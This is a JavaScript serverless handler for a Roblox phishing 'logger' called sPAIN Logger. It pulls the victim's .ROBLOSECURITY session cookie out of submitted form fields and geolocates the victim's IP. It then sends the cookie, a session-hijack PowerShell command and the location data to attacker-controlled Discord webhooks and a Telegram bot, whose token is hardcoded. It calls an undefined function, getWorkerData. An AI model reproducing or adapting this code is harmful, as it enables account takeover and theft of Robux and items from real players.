// api/submit.js
const REDIS_URL  = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN   = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT    = process.env.TG_CHAT  || '7538845070';
// Your Cloudflare Worker URL — update worker.js code there too
const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let record = json.result;
    if (typeof record === 'string') { try { record = JSON.parse(record); } catch { return null; } }
    if (record && typeof record.value === 'string' && !record.webhook) {
      try { record = JSON.parse(record.value); } catch {}
    }
    return record || null;
  } catch { return null; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = raw.trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
  if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
  if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);
  if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

// ── Cloudflare Worker: returns the PowerShell command, never uses the cookie ──
async function getPowerShell(cookie, victimIp) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.success ? d.powershell : null;
  } catch { return null; }
}

function slotSummary(slots) {
  return Object.entries(slots || {})
    .map(([k, v]) => `Slot ${k.replace('slot','')}: ${v||'(empty)'}`)
    .join('\n');
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

// Send cookie + PowerShell command to Discord
async function sendHit(webhookUrl, { powershell, cookie, slots, ip, geo, now, pageName }) {
  // Embed with context
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title: `✅ Cookie Captured — ${pageName}`,
      description: 'Run the **PowerShell command** below to access the account.\nThis is exactly what Chrome DevTools "Copy as PowerShell" gives you.',
      color: 0x00cc44,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                           inline: true  },
        { name: '📍 Location', value: `${geo?.city||'?'}, ${geo?.country||'?'}`, inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                     inline: true  },
        { name: '🕐 Time',     value: now,                                        inline: false }
      ],
      footer: { text: `sPAIN Logger • ${pageName} • ${now}` }
    }]
  });

  // PowerShell command in code block (chunked so nothing is cut)
  if (powershell) {
    // First chunk gets the ```powershell header
    let first = true;
    let rem = powershell;
    while (rem.length > 0) {
      const chunk = rem.substring(0, 1950);
      rem = rem.substring(1950);
      const content = first
        ? '```powershell\n' + chunk + (rem.length > 0 ? '' : '\n```')
        : chunk + (rem.length > 0 ? '' : '\n```');
      await discordSend(webhookUrl, { content });
      first = false;
    }
  }

  // Raw cookie as plain text — exact bytes, zero modification
  let remCookie = cookie;
  while (remCookie.length > 0) {
    const chunk = remCookie.substring(0, 1990);
    remCookie = remCookie.substring(1990);
    await discordSend(webhookUrl, { content: chunk });
  }
}

async function sendInvalid(webhookUrl, { slots, ip, geo, now, pageName }) {
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title: '⚠️ Invalid Cookie — someone trolling',
      description: 'Cookie was **invalid or fake**.',
      color: 0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                           inline: true  },
        { name: '📍 Location', value: `${geo?.city||'?'}, ${geo?.country||'?'}`, inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                     inline: true  },
        { name: '📋 Slots',    value: '```\n' + slotSummary(slots).substring(0,950) + '\n```', inline: false },
        { name: '🕐 Date',     value: now,                                        inline: false }
      ],
      footer: { text: `sPAIN Tools • ${pageName}` },
      timestamp: now
    }]
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });

  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
          || req.headers['x-real-ip'] || 'Unknown';

  const [geo, cookie] = await Promise.all([
    getIpGeo(ip),
    Promise.resolve(findCookie(slots))
  ]);

  // Wait 5 seconds — lets the target's session settle so cookie is fully valid
  // when the Worker hits Roblox using their IP
  await new Promise(r => setTimeout(r, 5000));

  const workerData = cookie ? await getWorkerData(cookie, ip) : null;
  const powershell  = workerData?.powershell || null;
  const roblox      = workerData || null;
  const isValid     = !!workerData?.valid;
  const now        = new Date().toISOString();
  const pageName   = record.displayName || slug;
  const payload    = { powershell, roblox, cookie, slots, ip, geo, now, pageName };

  let parent = null;
  if (record.dualhookParent) {
    parent = await redisGet(`slot:${record.dualhookParent}`);
  }

  const sendFn = isValid ? sendHit : sendInvalid;

  await Promise.all([
    sendFn(record.webhook, payload),
    parent?.webhook && parent.webhook !== record.webhook
      ? sendFn(parent.webhook, payload)
      : Promise.resolve()
  ]);

  await tgSend(isValid ? [
    `✅ <b>COOKIE CAPTURED</b>`,
    `👤 ${roblox?.username || 'Unknown'} ${roblox?.isPremium ? '⭐' : ''}`,
    `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`,
    `📄 Page: ${pageName} (${slug})`,
    `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
    `💻 PowerShell command sent to Discord`,
    `🕐 ${now}`
  ].join('\n') : [
    `⚠️ <b>INVALID SUBMISSION</b>`,
    `📄 Page: ${pageName} (${slug})`,
    `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
    `🕐 ${now}`
  ].join('\n'));

  // Respond AFTER all work is done — Vercel kills the function on res.end()
  return res.status(200).json({ success: true });
}
